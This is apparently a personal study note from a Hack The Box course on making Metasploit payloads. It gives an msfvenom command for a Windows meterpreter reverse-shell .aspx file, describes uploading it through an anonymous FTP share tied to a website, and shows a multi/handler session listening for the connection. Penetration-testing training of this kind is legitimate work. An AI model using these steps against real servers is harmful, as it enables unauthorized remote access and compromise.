# Creating Payloads
## Aspx Example
```Markdown
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f aspx > reverse_shell.aspx
```
- in their example, they put the file into an anonymous FTP share that connected to a website, meaning they were able to navigate to the page and execute it
  
## Setting up Multi/Handler
```Markdown
msfconsole
use multi/handler
# set options
```
```Markdown
Nathan2112@htb[/htb]$ msfconsole -q 
msf6 > use multi/handler
msf6 exploit(multi/handler) > show options
Module options (exploit/multi/handler):
   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Exploit target:
   Id  Name
   --  ----
   0   Wildcard Target

msf6 exploit(multi/handler) > set LHOST 10.10.14.5
LHOST => 10.10.14.5

msf6 exploit(multi/handler) > set LPORT 1337
LPORT => 1337

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.5:1337 
```